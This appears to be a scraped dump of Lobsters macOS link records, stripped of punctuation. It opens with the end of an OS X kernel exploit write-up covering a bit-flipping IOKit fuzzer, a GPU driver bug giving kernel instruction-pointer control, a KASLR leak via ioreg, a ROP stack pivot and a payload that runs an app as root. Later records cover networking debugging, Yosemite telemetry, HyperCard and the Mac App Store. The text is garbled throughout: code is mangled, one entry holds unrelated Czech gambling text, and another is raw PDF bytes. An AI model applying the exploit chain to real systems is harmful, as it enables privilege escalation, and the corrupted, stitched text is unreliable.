want mutate valid argument ioconnectcallmethod check talk chen xiaobo xu hao exactly dyld interposing dyld o x dynamic linker similar using ldpreload linux dyld support dynamic link time interposition function mean intercept function call different library inspect modify argument complete ioconnectcallmethod fuzzer interpose library wrote include stdinth include stdioh include stdlibh include timeh include iokitiokitlibh int maybe static int seeded seeded srand time null seeded return rand void flipbit void buf sizet len len return sizet offset rand len buf offset rand kernreturnt fakeioconnectcallmethod machportt connection selector input inputcnt void inputstruct sizet inputstructcnt output outputcnt void outputstruct sizet outputstructcntp maybe flipbit input sizeof input inputcnt maybe flipbit inputstruct inputstructcnt return ioconnectcallmethod connection selector input inputcnt inputstruct inputstructcnt output outputcnt outputstruct outputstructcntp typedef struct interposer void replacement void original interposet attribute used static const interposet interposers attribute section data interpose replacement void fakeioconnectcallmethod original void ioconnectcallmethod compile dynamic library clang wall dynamiclib flipdylib flipc framework iokit arch arch load dyldinsertlibrariesflipdylib helloworld time flip one bit struct input scalar input iokit external method fuzzer found bug used get kernel instruction pointer control found well clue intel gpu driver worked intelaccelerator bug running fuzzer shown program using gpu lead within second crash following method kernel extension instruction offset igaccelglcontext unmapusermemory rdi intelglunmapusermemoryin rsi unsigned long long rdx qword ptr cmp rdx jnz mov rbx rsi rsi point controlled data mov rbx rbx completely controlled mov rbx mov rax rbx crash mov rdi rbx call qword ptr looking cross reference function ida pro see unmapusermemory selector igaccelglcontent user client external method one struct input entry function rsi point controlled data rdx contains length struct input byte address function read first byte struct input qword save rbx point rbx completely controlled controlled value saved local variable later value read back rbx controlled value dereferenced without check leading crash dereferences nt crash however qword value offset read value called word external method treating struct input byte containing pointer c object calling virtual method object without checking whether pointer valid kernel space trusting userspace ever pas valid kernel object pointer crafting fake iokit object passing pointer struct input selector igaccelglcontent get kernel instruction pointer control smepsmap smep smap two cpu feature designed make exploitation type bug trickier maverick support supervisor mode execute prevention mean processor executing kernel code cpu fault try execute code page belonging userspace prevents u simply mapping executable kernel shellcode payload known address userspace getting kernel jump generic defeat mitigation codereuse rop rather diverting execution directly shellcode userspace instead divert existing executable code kernel pivoting stack pointer controlled data easily chain together multiple code chunk either turn smep execute entire payload rop second generic mitigation supported cpu level supervisor mode access prevention name suggests prevents kernel code even reading user page directly would mean able get controlled data known location kernel space fake iokit object rop stack since able dereference userspace address even read however maverick support smap problem put fake iokit object vtable rop stack userspace kaslr write rop stack need know exact location kernel code planning reuse o x kernel address space layout randomisation mean different address kernel code could located one randomly chosen boot time therefore find address executable code chunk need way determine distance kaslr shifted code memory value known kaslr slide iokit registry briefly mentioned earlier iokit registry allows userspace program find hardware actually mean iokit registry really place driver publish key value pair key string value something equivalent corefoundation data type driver also specify key configurable mean userspace use iokit registry api set new value mig rpcs reading setting iokit registry value routine ioregistryentrygetproperty registryentry ioobjectt propertyname ionamet property iobufptrt physicalcopy routine ioregistryentrysetproperties registryentry ioobjectt property iobufptrt physicalcopy result kernreturnt important part kernelside implementation function firstly setting property kernreturnt isioregistryentrysetproperties ioobjectt registryentry iobufptrt property machmsgtypenumbert propertiescnt kernreturnt result obj osunserializexml const char data propertiescnt configmacf else maciokitchecksetproperties kauthcredget registryentry obj re kioreturnnotpermitted endif else re entry setproperties obj secondly reading property kernreturnt isioregistryentrygetproperty ioobjectt registryentry ionamet propertyname iobufptrt property machmsgtypenumbert propertiescnt obj entry copyproperty propertyname obj return kioreturnnotfound osserialize osserialize withcapacity obj serialize len getlength propertiescnt len err copyoutkdata text len property function pretty simple wrapper around setproperties copyproperty function implemented driver one important thing pick though isioregistryentrysetproperties function mac hook highlighted red allows sandbox profile restrict ability set iokit registry value hook exposed sandboxkext iokitsetproperties operation contrast isioregistryentrygetproperty function mac hook mean read access iokit registry restricted every o x process full access read every single key value pair exposed every iokit driver enumerating iokit registry o x ship ioreg tool exploring iokit registry command line passing l flag get ioreg enumerate registry key dump value since looking kernel pointer let grep output looking byte pattern expect see kernel pointer ioreg l grep ioplatformargs look awful lot like hexdump kernel pointer looking ioplatformargs string xnu source code see first pointer actually address devicetree passed kernel boot happens kaslr slide get applied kernel image also get applied devicetree pointer meaning simply subtract constant leaked pointer determine runtime load address kernel allowing u rebase rop stack check blog post winocm lot insight bug applicability io o x kernel rop pivot looking disassembly unmapusermemory see controlled virtual method called rax register point fake vtable put userspace pointer offset function pointer get called make vtable convenient place rop stack need find sequence instruction move value rax rsp machkernel binary following instruction sequence push rax add rax eax add bl pop rsp pop pop pop rbp ret push vtable address stack corrupt first entry vtable write byte rbx pointer fake iokit object control pointed userspace neither writes crash pop rsp pop top stack rsp since pushed rax stack mean rsp point fake vtable userspace code pop value rbp return meaning place full rop stack fake vtable fake iokit object payload continuation o x kernel function kuncexecute really easy way launch gui application kernel code kernreturnt kuncexecute char executionpath int uid int gid payload exploit rop stack called passing pointer string applicationscalculatorappcontentsmacoscalculator executionpath uid gid parameter launch o x calculator root take look exploit iokit bug take slightly different approach using handful rop gadget first disable smep call complicated shellcode payload userspace still running o x maverick try executing kernel payload call kernel function threadexceptionreturn return back usermode however appear whole system frozen kernel payload actually run verify attaching kernel debugger longer interact system got kernel code execution unmapusermemory took two lock drop lock function able get gpu driver grind halt check linked exploit see example shellcode drop lock conclusion actual development process sandbox escape nothing like linear writeup made seem many missed turn bug looked like far much effort exploit naturally reported apple case month conclusion decided take another look gpu driver o x time focusing manual analysis take look following bug report poc code detail individual bug
699,Lobsters,mac,Apple macOS,"Chasing an EPROTOTYPE Through Rust, Sendto, and the OSX Kernel With C-Reduce",https://erickt.github.io/blog/2014/11/19/adventures-in-debugging-a-potential-osx-kernel-bug/,chasing eprototype rust sendto osx kernel creduce,gist creduce professor john regehr bay area rust meetup pull request creduce gist timeoutsh http wwwopensourceapplecom unoffical github repository eprototype bsdkernuipcusrreqc bsdnetinettcpusrreqc,slight diversion serialization series last week strcat submitted pull request add support using vec writer weekend submitted allows used reader overall pretty simple change however running test suite found std io net tcp test occasionally failing test fn let addr let mut acceptor tcplistener bind addr listen spawn proc let stream tcpstream connect addr close let mut stream acceptoraccept let buf loop match streamwrite buf ok err e assert ekind connectionreset ekind brokenpipe ekind connectionaborted unknown error e break write would succeed time occasionally error unknown error protocol wrong type socket eprototype errno really surprising error far know function return errno socket socketpair connect searched everywhere find documentation suggesting write would ever produce error one ran bjz opened describing problem one interesting thing note also osx yosemite took little bit time extract test rust test suite gist got someone rustinternals run linux little driver script binsh set e rustc testrs seq test tcp test done error seems system dependent experimentation showed introduced sleep mutex synchronization appeared fix problem well point sure nonissue bug code bug o one thing sure though bug could scattered somewhere across rust codebase std io alone file around line pain cut self contained test case fortunately got creduce help u back may professor john regehr university utah came bay area rust meetup talk compiler testing fuzzing recorded talk want watch find one thing talked tool creduce research group developed automatically cut unnecessary line code still reproduce bug looking written target c file turn rust syntatically close enough c work pretty well need single source file driver script report compiled source file reproduced bug aside way one thing weekend put together homebrew pull request creduce landed yet want use brew install http rawgithubusercontentcomerickthomebrewdeltaandcreducelibraryformuladeltarb brew install http rawgithubusercontentcomerickthomebrewdeltaandcreducelibraryformulacreducerb hopefully land soon able anyway back story got rather large code base cover creduce pretty good job trimming away line pointing entire std module bit much handle reasonable amount time probably need semantic information rust better job cutting broad swath code needed least rough pas slim file figured problem probably contained std io std sys wrote simple testrs explicitly included module part crate see gist interested used pretty printer merge one file rustc pretty normal testrs testrs aside pretty printer still bug filed fortunately pretty simple fix case hand generated stdrs odds good fixed time might use process next need driver script adapt one special consideration need make sure exit return code version stdrs compiling error eprototype binsh rustc unusedimports unusedunsafe noncamelcasetypes unusedvariables test test testrs devnull ne exit fi root dirname seq roottimeoutsh test nocapture tcp test tee log grep protocol wrong type socket log ret ret eq exit elif ret eq exit fi echo done exit used helper script timeoutsh time test case creduce accidentally made u infinite loop finally ready start running creduce creduce driversh testrs running interestingness test parallel passblank byte passclangbinsrch replacefunctiondefwithdecl passclangbinsrch removeunusedfunction passlines byte byte byte byte byte byte byte byte byte byte byte byte let run background sometime background thing got back creduce automatically reduced file slim reran rust lint enabled manually cut dead code creduce failed remove flattened away unnecessary structs method finally left extern crate libc use std io net ip use std io net ip socketaddr use std io net ip tosocketaddr use std io net ip use std io test use std mem use std num int use std o errno use std o errorstring use std ptr fn bind addr ip socketaddr libc cint unsafe let fd match libc socket libc afinet libc sockstream panic fd fd let mut storage mem zeroed let len addrtosockaddr addr mut storage let addrp storage const const libc sockaddr match libc bind fd addrp len panic fd fn listen fd libc cint backlog int unsafe match libc listen fd backlog libc cint panic fn accept fd libc cint libc cint unsafe let x libc accept fd ptr nullmut ptr nullmut match x panic fd fd fn connect addr socketaddr libc cint unsafe let fd match libc socket libc afinet libc sockstream panic fd fd let mut storage mem zeroed let len addrtosockaddr addr mut storage let addrp storage const const libc sockaddr let x libc connect fd addrp len fd fn write fd libc cint buf result uint unsafe let len buflen let ret libc send fd bufasptr const len libc sizet ret err errno else ok fn close fd libc cint unsafe let x libc close fd asserteq x fn addrtosockaddr addr socketaddr storage mut libc sockaddrstorage libc socklent let inaddr match addrip b c let ip b c libc inaddr saddr int frombe ip panic unsafe let storage storage mut mut libc sockaddrin storage sinfamily libc afinet libc safamilyt storage sinport addrporttobe storage sinaddr inaddr let len mem sizeof libc sockaddrin len libc socklent fn main let addr let listener bind addr listen listener spawn proc let address addrtosocketaddrall unwrap addr addressesintoiter let fd connect addr close fd return let stream accept listener loop let x write stream match x ok err e let e e assert e libc econnrefused e libc epipe e libc econnaborted unknown error e errorstring e uint break close stream close listener snippet reproduces eprototype started top post pretty cool got without much effort point might say extracted yeah would right pretty much cinrust implementation bug great using creduce make rough guess file important include testrs eventually get rust plugins written creduce probably could point whole libstd let creduce thing hand pretty long painful manual process especially trying debug codegen runtime bug past spent hour reducing codegen bug small snippet creduce also able produce couple minute last step code eliminate rust picture translate code c include stdioh include unistdh include stdlibh include stringsh include syssocketh include netinetinh include pthreadh include errnoh int doserver int fd struct sockaddrin serveraddr fd socket afinet sockstream fd perror error socket server exit bzero char serveraddr sizeof serveraddr serveraddrsinfamily afinet serveraddrsinaddrsaddr inaddrany serveraddrsinport htons bind fd struct sockaddr serveraddr sizeof serveraddr perror error binding exit return fd void dochildthread void unused struct sockaddrin clientaddr int fd fd socket afinet sockstream fd perror error socket client exit bzero char clientaddr sizeof clientaddr clientaddrsinfamily afinet clientaddrsinaddrsaddr inaddrany clientaddrsinport htons connect fd struct sockaddr clientaddr sizeof clientaddr perror error connect exit fprintf stderr closing client socketn close fd perror error close client socket exit fprintf stderr closed client socketn return null int main int argc char argv int serverfd clientfd socklent clientlen struct sockaddrin clientaddr char buf n pthreadt childthread int rc signal sigpipe sigign serverfd doserver rc listen serverfd rc perror error listen return rc pthreadcreate childthread null dochildthread null rc perror error pthreadcreate return clientlen sizeof clientaddr clientfd accept serverfd struct sockaddr clientaddr clientlen clientfd perror error accept return fprintf stderr sendn rc send clientfd buf sizeof buf fprintf stderr send dn rc rc errno epipe break else int sotype socklent solen sizeof sotype getsockopt clientfd solsocket sotype sotype solen fprintf stderr type dn sotype sockstream perror error send return fprintf stderr server closing client fdn close clientfd perror error close client return fprintf stderr server closing client fdn fprintf stderr server closing fdn close serverfd perror error close server return fprintf stderr server closing fdn rc pthreadjoin childthread null rc rc esrch fprintf stderr error pthreadjoin dn rc return return also produce eprototype eliminate rust altogther let keep digging exactly producing error linux use strace program mac similar tool called dtruss seemed slow thing enough eprototype never happened fortunately though another program called errinfo print errno along every syscall one terminal ran test sleep done sudo errinfo n test aout aout open aout psynchmutexwait aout writenocancel aout sendto aout writenocancel aout writenocancel aout sendto protocol wrong type socket aout writenocancel aout getsockopt right see sendto syscall actually returning eprototype errno definitely created inside osx kernel userspace code fortunately apple kernel xnu open sourced dig last layer find tarballs http wwwopensourceapplecom rather use unoffical github repository using github search tool find instance eprototype codebase know xnu codebase still really interesting thing find first bsdkernuipcusrreqc return success einval eopnotsupp epipe enotconn eisconn unpinternalize einval unpinternalize ebadf unpconnect eafnosupport address family supported unpconnect einval invalid argument unpconnect enotsock socket unpconnect econnrefused connection refused unpconnect eisconn socket connected unpconnect eprototype protocol wrong type socket unpconnect sbappendaddr enobufs argument content modified sbappendaddr whatever filter author chooses static int uipcsend struct socket int flag struct mbuf struct sockaddr nam struct mbuf control proct p hey look handler send syscall although ipc tcp actually document return eprototype explain exactly happen fact mention unpconnect hint uipcsend may trigger connect exactly find couple line function connect connected yet note better implementation would complain equal peer address sostate ssisconnected nam error unpconnect nam p error break xxx else error enotconn break fact comment say socket might connected yet send hint apple may introduced level asynchrony preemption socket trigger actual connect could return eprototype make sense unfortunately still quite behavior seeing getting eprototype first write done couple believe find behavior actual tcp syscall file bsdnetinettcpusrreqc static int tcpusrsend struct socket int flag struct mbuf struct sockaddr nam struct mbuf control struct proc p int error struct inpcb inp sotoinpcb struct tcpcb tp msgpri msgpridefault int endif inp null inp inpstate inpcbstatedead necp necpsocketshoulduseflowdivert inp endif necp oops lost race tcp session got reset checked sscantsendmore eg uiomove network interrupt nonsplnet section sosend null mfreem control null mfreem control control null inp null error econnreset xxx epipe else error eprototype tp null goto believe comment explains everything seeing trigger send kernel middle tearing socket return eprototype look error could retry socket fully torn eventually return proper epipe also pretty easy test modified inner loop c test fprintf stderr sendn rc send clientfd buf sizeof buf fprintf stderr send dn rc rc errno epipe break else errno eprototype continue else int sotype socklent solen sizeof sotype getsockopt clientfd solsocket sotype sotype solen fprintf stderr type dn sotype sockstream perror error send return yep exit cleanly think pretty clear point weird kernel corruption bug going poorly documented edge case sure fun chasing condition system prevent anyone else tripping edge case filed apple radar ticket number apple employee reading hopefully anyone run mysterious eprototype documented least chance stumble blog post save weekend diving o
701,Lobsters,mac,Apple macOS,"Thoughts on OS X Yosemite, Arch Linux and xmonad",http://blog.jakubarnold.cz/2014/11/16/thoughts-on-os-x-yosemite-arch-linux-and-xmonad.html,thought o x yosemite arch linux xmonad,jako hra ale se mohou velice formou bude bavit online naâ trhu python ruby php c java javascript hru tetri ruletu jazyky pro hry pro telefony lego mindstorms programmer lega lego super mario ne na kurzy jako je codeorg aplikaci kodu od microsoftu je zdarma kurz codinggame sololearn khan academy sudoku stylu maria java naleznete zde bez wikipedie wikipedii online pokeru studium na zrychlete si jeho tipy na software zdarma,ministerstvo varuje na vzniknout jako hra ale se mohou velice formou bude bavit foto pixabay online naâ trhu fortuna bonus za tipsport bonus k vkladu za synot tip bonus k vkladu za chance bonus k vkladu za ministerstvo varuje na vzniknout se jako ale sâ se tomuto kâ tomu kdo dispozice kolik je ochoten ale je je si ujasnit co od jestli si chcete napsat webovou aplikaci nebo program pro pc atd podle toho se jazyka se pro na c nebo pascal sice byste zâ nich pochytili ty jsou ale je na jazyku dnes je velice python ruby php c java javascript zcela pro je c je si stanovit se jakmile napsat hru tetri bude se zâ ale zkusit ruletu jazyky java se vâ c nebo net jazyk je trochu ale zase kamkoliv php mezi sâ jazykem se na trhu python velice jednoduchou syntaxi ale je velice pro foto pixabay pro abyste se mohli programovat pochopit logiku stavbu struktury hry pro telefony tablety se lego mindstorms programmer pro io android se tedy programy stavebnici od lega kâ tomu program je ke zdarma jestli je na moc tak lego super mario ne na kurzy jako je codeorg jsou zde kurzy nebo dokonce ty na kolem let se jim logika je videa jsou vâ mohou aplikaci kodu od microsoftu se engine si zâ mohou hru program podporuje se pro ke je zdarma kurz se zapsat kurzu ale celou vâ jsou tyto kurzy na se programovat po kurzy roku rok bychom aplikace dovedou hravou formou jsme codeorg ale projekty jako je codinggame kde se video vâ hned vedle je okno kam zapisujete syntaxi upravujete chod videohry je velice si sami vybrat jazyk si touto formou tento je anglicky zâ lze kâ je sololearn zde se programovat vâ pythonu c nebo vâ lekce absolvovat ale lze si aplikace pro android io se u znalosti pokud se chcete sql potom je dobrou volbou khan academy kde je kurz vâ co si zkusit naprogramovat budete znalosti sudoku stylu maria java pokud chcete proniknout vâ jazyce java pro je velice kapitol naleznete zde pokud byste jen tak potom lze zâ na youtube si pustit rovnou si podle nastavit hned nic je dalo se jako bez jakmile svou posunete na ãºlohy jako je jako optimalizace zde si definici zâ wikipedie jako nebo optimalizace lp se minimum nebo maximum funkce na soustavou nerovnic abyste naplno budete se muset naladit se na je design ze komponent program se pak zâ komponent mohou projekty pro definici wikipedii je jako online pokeru se snadno ale aby se z stal je cesta velmi se natolik studium na zrychlete si jeho tipy na software zdarma hrajte ministerstvo varuje na vzniknout se
702,Lobsters,mac,Apple macOS,Steve Jobs - The Lost Interview,https://www.youtube.com/watch?v=TRZAJY23xio,steve job lost interview,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature steve job lost interview youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature steve job lost interview youtube
703,Lobsters,mac,Apple macOS,"Clicking ""About This Mac"" in Yosemite sends identifying information to Apple",https://github.com/fix-macosx/yosemite-phone-home,clicking mac yosemite sends identifying information apple,et phone home explore yosemite share user data apple net monitor example mac adobeomniture analytics software duckduckgo privacy still sent apple system preference spotlight noncloud mail account sends domain entered user apple methodology usage caveat caveat contributing documenting automated dataset visualizationdecoding sslsplit netmonitor,et phone home repository provides corpus network communication automatically sent apple o x yosemite using dataset explore yosemite share user data apple provided data collected using net monitor toolkit information regarding usage methodology provided example following occur privacy option enabled including disabling analytics ie diagnostics usage data mac user selects mac apple menu yosemite phone home svi unique analytics identifier included request informationappcontentsmacossystem svi used adobeomniture analytics software search log cookie value find duckduckgo privacy read duckduckgo privacy statement might decide switch safari default search duckduckgo enter new search safari search logged data see search term actually sent log show copy safari search still sent apple even selecting duckduckgo search provider spotlight suggestion disabled system preference spotlight noncloud mail account setting new mailapp account address admin fixmacosxcom hosted locally searching log fixmacosxcom show mail quietly sends domain entered user apple methodology usage caveat two different datasets provided generated independent vms fresh installs mac o x yosemite data sharing option disabled location service disabled icloud used apple id used duckduckgo selected safari search engine installed default option including sending diagnostics usage data icloud icloud feature enabled including icloud drive tcpssl connection logged one file per connection application path iso time username src addr destaddr log nontcp traffic udp icmp logged pcap format udpmonitor pcap caveat data collected course hour minimal interaction system application complete representative set data potentially collected yosemite example dataset contain diagnostics data periodically sent apple cursory usage mean applicationspecific log representative eg setting mail account entered information first screen correlation socket file system executable path reasonably accurate actual correspondance sanity checked seen case procpidpath returned path process could running tl traffic using client certificate captured plaintext default example nm capture key exchange performed apsd apple push service daemon establishes client certificate nm ca nt transparently sniff future communication protected certificate without addition apsdspecific protocol handling traffic logged plaintext lack match search treated conclusive may necessary decode data encoded transmission via url encoding protobuf etc contributing help requested following area finding documenting privacy issue enhanced automated dataset visualizationdecoding adding applicationspecific support process using clientcertificates sslsplit automated generation datasets eg scripting installation application use using netmonitor gather data airdrop handoff technology difficult run vm environment exploring workarounds eg sandboxing firewalling
704,Lobsters,mac,Apple macOS,Why Hypercard Had to Die,http://www.loper-os.org/?p=568,hypercard die,update click hypercard macintosh performas rom basic commodore hypertalk cray mac hypercard one loved software product ever created quite possibly inspiration world wide web one could even find rich famous steve job returned exile rule apple let hypercard wither away die emulator basilisk copy hypercard hypertalk eval equal eval several known unofficial explanation ranging entirely innocuous downright diabolical could everything magnetized needle steady hand could text editor could anything roman numeral could arabic numeral intercal killed anyway clue apple never brought market anything resembling hypercard despite frequent call hypercard echo different world one distinction use programming computer weakened mindamplifier apple walled garden aesthetic traditional relationship bicycle mind monsanto company apple today lacking steve job stake heart shortage attempt insist capable complexityladen hypercard xcode processing steve job kill lisp machine version newton kill entire newton project job deliberately killed community even release source community lack hypercard radical simplicity resulting explorability master survey matter harmless,update click would like try hypercard hypercard version home card hypercard child though friendship brief seventhgrade class led room full brandnew macintosh performas day lesson crash course use uncomplicated yet marvelous program one might persuade computer anything everything seemed child attention span appreciate wonder half dozen u invited back week later several delicious month among pupil one already dabbled programming compared familiar rom basic family secondhand commodore hypertalk language seemed clunky comically verbose yet something magical something oddly enthralling hypercard whole ease mostlyblank screen could turned interactive living breathing graphical toy creation astounding exhilarating addictive final week one schoolboy driven distant office building asked present unremarkable creation front darkened lecture hall latter full somberfaced suitwearing adult idly tapping away costly apple portable lukewarm applause adventure came rather boring end lacking true english fluency time never learned exactly behind brief departure braindead routine early schooling without regular access mac given expense may well cray far family concerned could return fascinating plaything development programmer continued begun almost entirely macless hypercardless though almost unknown sniveling digital trendoids today hypercard one loved software product ever created quite possibly inspiration world wide web among satisfied user one could even find rich famous steve job returned exile rule apple let hypercard wither away die order answer question necessary actually power old mac emulator try hypercard skin even today still wealth hypercardrelated material net unable find compact hello world style walkthrough example created one basic four function calculator material needed recipe basilisk copy hypercard optional hypertalk manual fished mine dumpster undergraduate student around half hour time spent arranging screenshots writing caption without delay create new hypercard stack give name save fresh stack blank card create field doubleclick give title lcd resize field reasonable dimension create button doubleclick click script button property dialog hypertalk script attach numeric operator key calculator one thing append text button name number operator calculator screen name going something like card button want append number five key pressed need take last whitespacedelimited word button name perform eval yielding number value operator simply hypertalk equivalent eval save button script give button appropriate name copy button many time needed create calculator numeric key need change button script name create operator key way need equal key create new button give name let give script need use hypertalk eval let actually try using calculator switch hypercard finger operation enter arithmetic expression make use four arithmetic function click equal key result appear quite useless calculator without clear key let add one script clear key nothing surprising clear key simple fourfunction calculator seen saw know steve job killed hypercard well probably nt nt either obviously man dead tell tale perhaps figure several known unofficial explanation ranging entirely innocuous downright diabolical anyone really believe mr job genuinely thought could everything cocoa projectbuilder could hypercard far intelligent man believe thing one may well say could everything magnetized needle steady hand could text editor could anything roman numeral could arabic numeral could anything intercal could common lisp forth job almost certainly familiar hypercard capability killed anyway would nt love know clue apple never brought market anything resembling hypercard despite frequent call despite moreorless guaranteed lively market cautiously predict never reason hypercard echo different world one distinction use programming computer weakened awaits neartotal erasure world personal computer mindamplifier merely expensive video telephone world apple walled garden aesthetic place may know steve job killed far greater thing hypercard almost certainly behind death lisp machine version newton may never learn else mr job perfectly logical reason prune apple tree thus returned company original vision personal computer consumer appliance black box enforcing traditional relationship vendor purchaser job supposedly claimed intended personal computer bicycle mind really sold u fairly comfortable train mind train go rail laid like train travel elsewhere river sweat pour forth army laborer preferably cupertino apple steve job needed hypercardlike product like monsanto company need home geneticengineering set apple today lacking steve job probably need stake heart either way expect hypercard workalikes apple vendor opensource project nothing either oh shortage attempt failure reason insist capable complexityladen hypercard thus none readily substitute think xcode python processing shit soup htmljavascriptcss kind substitute hypercard read post continue think might autistic typical software engineer please nt waste time commenting sink back cube farm hellpit whence came otherwise sit contemplate fact built could probably built correction edits steve job kill lisp machine version newton kill entire newton project comment pointing hypercard already obsolete steve job killed missing point job deliberately killed community refusing maintain product even release source could released source welcoming hand ten thousand enthusiast modern hypercard clone substantially complex therefore inferior original add hypercard community elementary tower babel situation critical mass user community wellknown phenomenon sure unknown job truly succeeded killing much basic concept hypercard community various hypercard clone hypercardinfluenced software lack hypercard radical simplicity resulting explorability explorability master survey variety matter extra feature featurerich system like supercard even vb harmless fundamental difference especially child system fully wrap mind around one countless mystery knob everybody pushing javascript python wxqt cocoa abomination hypercard replacement simply remember child andor lack creative bone body andor malicious idiot http wwwloperosorg may update seems like many reader continue miss essential point hypercard nt gem graphic design colour plain line graphic programming language design one many laughable attempt natural language programming highperformance number crunching simple ie entire system fully covered page printed manual fit one head take year fitinhead either intelligent child could become master survey week two printed manual current m vb www htmljscssetc stack yes including browser wart proposed replacement many tree would killed print manual would fit house could read cover cover would die old age first
705,Lobsters,mac,Apple macOS,OS X 10.10 Yosemite: The Ars Technica Review,http://arstechnica.com/apple/2014/10/os-x-10-10/,o x yosemite ar technica review,o x maverick tangible energy saving internal change new framework many new uservisible feature new bundled application timidity awkwardness naming scheme postforstall io jony ive craig federighi tore old obscure surfing location yosemite extreme makeover remains committed mac strong independent platform together avfoundation core animation worldwide developer conference framework apis cloud service programming language dramatic leadership restructuring federighi io maverick table content,aurich lawson thinkstock book finally closed product line known o x last year release o x maverick may end getting short shrift sure brought tangible energy saving benefit mac laptop owner gain quickly taken granted internal change new framework memorable customer may developer technophile maverick included many new uservisible feature even new bundled application cumulative effect pleasant upgrade blockbuster timidity awkwardness maverick marked turning point o naming scheme first o x release newly unified postforstall apple io explosive release jony ive pentup software design ethos maverick embodiment craig federighi patient engineering discipline maybe maverick victim time constraint priority either way last year o x release apple tore old year finally apple ready new signal mac newfound confidence apple traded obscure surfing location one best known beautiful national park yosemite new o headline feature one sure make noteworthy chapter annals o x allnew user interface appearance course change come year io got extreme makeover ah old tension platform apple love io continues dominate apple business term unit sale revenue profit last year apple watcher openly wondered whether apple would even bother updating look o x yet past several year apple loudly publicly insisted remains committed mac strong independent platform yosemite aim fulfill interesting way together o x io trading technology time example avfoundation apple modern framework manipulating audiovisual medium released io year appeared o x going direction core animation though integral part entire iphone interface released first mac yosemite new look continues pattern io got visual refresh last year o x turn year worldwide developer conference apple made several announcement point new direction io o x advancing lockstep new technology appear platform simultaneously also aim weave together new shared triumph run gamut traditional framework apis cloud service foundation apple software ecosystem programming language apple dramatic leadership restructuring put federighi charge io o unification thought two year later resulted clear unification action even ardent mac fan admit io bigger update maverick time around finally fair fight table content listing image aurich lawson thinkstock
706,Lobsters,mac,Apple macOS,Mac App Store: The Subtle Exodus,http://blog.helftone.com/mac-app-store-the-subtle-exodus/,mac app store subtle exodus,mac app store notable developer abandoning platform right thing delaying ma submission broken trial upgrade deeper look sandboxing app sandboxing sandboxed entire category distributed sourcetree last updated customer review final word joe steel back blog reading,mac app store released january marked beginning great new distribution channel even though lacked bell whistle developer community hopeful problem would addressed due course unfortunately year evidence core issue would addressed future notable developer abandoning platform right thing customer delaying ma submission something broken believe inaction harmful whole mac community affecting consumer developer alike let make absolutely clear writing first foremost deeply care mac platform future pain see developer abandoning mac app store much better sustain business foster ecosystem value reward innovation high quality software talk developer behind scene explore mac app store find something completely different look mac app store better let take moment give credit due mac app store simply convenient way purchase download software bar none unfortunately good thing end large amount evidence one effect mac app store tendency push developer unsustainable pricing might say designed way look bit let get one thing straight see comment along line ma might worse developer mean better consumer present false dichotomy somehow developer consumer odds could nt truth relationship consumer developer symbiotic one exist without mac app store hostile environment developer going end situation either software supported anymore even worse wo nt made result way around consumer business would go bankrupt software made mac app store work way beneficial developer consumer alike nt one ma harmful either developer consumer long term inevitably harmful trial let talk trial idea behind straightforward around decade simply put come evaluating product test looking screenshots video review provides good starting point tell full story consumer best judge whether app fulfills need requiring upfront payment consumer evaluate software make sense let try everything want naturally best value software win usually highest quality reasonable price tag multiple winner price tier high quality software expensive people afford throw chance might turn adequate need consequence developer producing high quality apps reduce price significantly level consumer afford take gamble price usually unsustainable support continued development standard quality end situation market easily support higherpriced quality software disallowed due arbitrary restriction mac app store regressed let best value app win let cheapest app win counterproductive long term worse still downward price spiral creates unrealistic expectation eye consumer software extremely cheap anything ripoff supporting app trial would trivial provide completely seamless experience would able download app play purchase single click effectively zero additional complexity example try shown besides price trial expired revert showing price possibly subtle subtitle saying trial expired trying app would click away easily accessible current workaround developer put trial website amount people even aware probably small enough make real difference alternatively intentionally crippled version apps branded lite variant get distributed free ma way emulate trial using quality app deliberately made inferior good idea simply truly representative feature might make difference purchasing would likely part full product another possibility would free app inapppurchase unlocks feature approach effectively lite exhibiting issue difference lite nonlite version unified single app expect see one star review user downloaded free app never expected wo nt actually free even developer best intention end result would bad customer experience many apps fundamentally incompatible model practically impossible remove enough feature still keeping free part useful end result crippleware upgrade paid upgrade seem really controversial topic quite simple business need continuing revenue stream operate basic economics reality simply enough new customer sustain company implies either software make abandoned point customer base need step provide continued funding multiple way provide continued funding eg subscription ad iaps took deeper look realise inferior compared paid upgrade want bombarded piecemeal inapppurchases every release want continually spammed annoying ad want buy free apps trick paying paid upgrade provide simple proposition developer put significant amount work next major iteration app existing user decide whether willing upgrade choose rewarded repeat custom getting discount supporting paid upgrade require much additional complexity know apple already keep multiple version apps install device support latest o developer publishes paid upgrade customer already owns app see upgrade button next installed consumer nt upgrade happily keep using version purchased long like firstclass support paid upgrade mean developer nt lose customer review rating usually take year accumulate big slap face start step one new major version published upgrade button would appear people already purchased app sandboxing app sandboxing great security feature provides assurance user apps wreak havoc whole system least amount access required sandboxing initially requirement mac app store launched apps submitted sandboxed developer found make hard choice severely degrade functionality software leave ma consequently entire category apps distributed via ma sandboxed without crippling feature set growing number abandoned apps severely lagging behind direct download counterpart talking popular apps obscure hack require kernel extension example ma version sourcetree last updated november almost year ago v time writing unacceptable either appropriate entitlement solution place sandboxing requirement ma put developer tough position either artificially limit app result bad user experience blamed developer abandon ma never find apps could existed never created due inability distributed ma might rely revenue ma would bring consequently uneconomical customer review idea behind customer review good one best judge software people use unfortunately several problem firstly review negatively biased people likely leave bad review unpleasant experience lead developer begging review various way usually distastefully popping dialog asking release note every story two side inability developer actually respond customer concern extremely damaging product lead loss sale would perfectly fair bad review based constructive criticism vast majority time simply case look one star review apps high average rating final word mac app store restricting multiple way tool available developer disposal sustain business distribute highquality apps discriminating tried true practice inarguably benefit consumer developer market left decide know whether eg paid upgrade better suited even option use joe steel decay mac app store last year pretty subtle developer leaving en masse one one new update developed weigh pro con customer pull ultimate fear complacent state mac app store would lead slow erosion mac indie community ma best place get software come bundled o convenient issue compound developer vote foot continue slow exodus feel apple need encourage availability high quality software rather quantity quality first step would addressing core issue known year mac platform would much worse place prioritise shortterm gain boasting hundred thousand free abandonware rather concentrate longterm fundamental sustain healthy innovative ecosystem back blog reading
707,Lobsters,mac,Apple macOS,Kqueue: A generic and scalable event notification facility,http://people.freebsd.org/~jlemon/papers/kqueue.pdf,kqueue generic scalable event notification facility,,obj stream l v uл w lv c endobj obj endobj obj type page mediabox parent r resource procset pdf text font r r r content r endobj obj stream 馡 iuz xq gu k b k v n w bkixz nr
